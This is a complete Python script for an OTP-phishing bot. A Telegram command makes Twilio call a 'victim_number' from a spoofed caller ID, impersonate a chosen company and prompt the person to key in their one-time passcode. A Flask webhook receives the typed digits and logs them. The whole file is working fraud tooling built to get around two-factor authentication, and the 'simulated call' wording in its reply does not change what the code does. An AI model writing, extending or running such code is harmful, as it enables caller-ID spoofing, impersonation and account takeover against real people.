import json
import os
import logging
import threading
from flask import Flask, request
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather
from telegram import Update, Bot
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import phonenumbers
import asyncio
from getpass import getpass
from concurrent.futures import ThreadPoolExecutor

# Initialize Flask app for webhook
app = Flask(__name__)

# Set up logging
logging.basicConfig(filename='app.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

# Configuration file location
CONFIG_FILE = "config.json"

# Load or initialize configuration
def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as file:
                return json.load(file)
        except json.JSONDecodeError:
            logger.error("Invalid configuration file format. Resetting to defaults.")
    return {}

# Save updated configuration to file
def save_config(config_data):
    with open(CONFIG_FILE, "w") as file:
        json.dump(config_data, file, indent=4)

# Validate phone number format using phonenumbers library
def validate_phone_number(number):
    try:
        parsed_number = phonenumbers.parse(number, None)
        return phonenumbers.is_valid_number(parsed_number)
    except phonenumbers.NumberParseException:
        return False

# Flask route to handle OTP input from Twilio
@app.route("/otp", methods=["POST"])
def receive_otp():
    otp = request.form.get("Digits", None)
    if not otp:
        return "Invalid input received", 400
    logger.info(f"Received OTP: {otp}")
    return "Thank you!", 200

# Asynchronous function for initiating a call
async def async_initiate_call(victim_number, prompt, spoof_number, company_name, language="en"):
    try:
        client = Client(config["TWILIO_SID"], config["TWILIO_AUTH_TOKEN"])
        voice_response = VoiceResponse()

        # Create a Gather object to capture key presses
        gather = Gather(input='dtmf', timeout=5, num_digits=config["otp_length"], action=f"{config['CALLBACK_URL']}/otp")
        gather.say(f"Hello, this is {company_name}. {prompt}")
        voice_response.append(gather)

        # If no input is received, handle that
        voice_response.say("We didn't receive any input. Goodbye.")

        # Make the call using the spoofed number
        call = client.calls.create(
            to=victim_number,
            from_=spoof_number,
            twiml=str(voice_response),
            status_callback=f"{config['CALLBACK_URL']}/status",
            timeout=config["call_timeout"]
        )
        logger.info(f"Call initiated to {victim_number}. Company: {company_name}, Spoofed from: {spoof_number}, Prompt: {prompt} (Call SID: {call.sid})")
    except Exception as e:
        logger.error(f"Error initiating call: {e}")
        raise ValueError("Failed to initiate the call. Please check your Twilio configuration or the provided phone numbers.")

# Telegram command to trigger OTP call
async def custom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 5:
        await update.message.reply_text("Usage: /custom <victimnumber> <company_name> <spoof_number> <full_name> <prompt_key>")
        return

    victim_number = args[0]
    company_name = args[1]
    spoof_number = args[2]
    full_name = args[3]
    prompt_key = args[4]

    if not validate_phone_number(victim_number):
        await update.message.reply_text("Invalid phone number format.")
        return

    if not validate_phone_number(spoof_number):
        await update.message.reply_text("Invalid spoof number format.")
        return

    if prompt_key not in config["prompts"]:
        await update.message.reply_text(f"Prompt key '{prompt_key}' does not exist.")
        return

    prompt = config["prompts"][prompt_key]
    prompt = f"{prompt}, {full_name}"

    try:
        await async_initiate_call(victim_number, prompt, spoof_number, company_name, config["language"])
        await update.message.reply_text(f"Simulated call initiated to {victim_number} with company name: {company_name} and spoofed number: {spoof_number}.")
    except ValueError as ve:
        await update.message.reply_text(str(ve))

# Function to reset the configuration to default values
def reset_to_defaults():
    global config
    config.clear()
    config.update(load_config())

# Function to configure user details interactively
def configure_details():
    config_data = {}

    # Collect necessary details
    print("Please enter the following details:")

    config_data["TWILIO_SID"] = input("Enter your Twilio SID: ").strip()
    config_data["TWILIO_AUTH_TOKEN"] = getpass("Enter your Twilio Auth Token: ").strip()
    config_data["TWILIO_PHONE_NUMBER"] = input("Enter your Twilio phone number (e.g., +1234567890): ").strip()
    config_data["TELEGRAM_BOT_TOKEN"] = getpass("Enter your Telegram bot token: ").strip()
    config_data["CALLBACK_URL"] = input("Enter your callback URL (e.g., http://your-callback-url): ").strip()
    config_data["otp_length"] = int(input("Enter the OTP length (e.g., 6): ").strip())
    config_data["language"] = input("Enter the language (default: en): ").strip() or "en"
    config_data["ai_enabled"] = input("Enable AI? (yes/no): ").strip().lower() == "yes"
    config_data["log_level"] = input("Enter log level (default: INFO): ").strip() or "INFO"
    config_data["call_timeout"] = int(input("Enter call timeout (default: 30): ").strip() or 30)
    config_data["retry_attempts"] = int(input("Enter retry attempts (default: 3): ").strip() or 3)
    config_data["schedule_enabled"] = input("Enable scheduling? (yes/no): ").strip().lower() == "yes"
    config_data["ai_prompt"] = input("Enter AI prompt message (default: Please enter the OTP you have received.): ").strip() or "Please enter the OTP you have received."
    config_data["company_name"] = input("Enter the company name (default: Default Company): ").strip() or "Default Company"
    config_data["spoof_number"] = input("Enter the spoof number (optional): ").strip() or ""
    config_data["prompts"] = {}

    # Save the config
    save_config(config_data)
    print("Configuration saved successfully!")

# Function to start the Telegram bot
def start_bot():
    application = ApplicationBuilder().token(config["TELEGRAM_BOT_TOKEN"]).build()
    application.add_handler(CommandHandler("custom", custom_command))
    application.run_polling()

# Main function to run the script
def main():
    # Load configuration or run the interactive configuration
    global config
    config = load_config()

    if not config:
        print("No configuration found. Please configure the details.")
        configure_details()

    # Start Flask app in a separate thread
    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=5000)).start()

    # Start the Telegram bot
    start_bot()

if __name__ == "__main__":
    main()
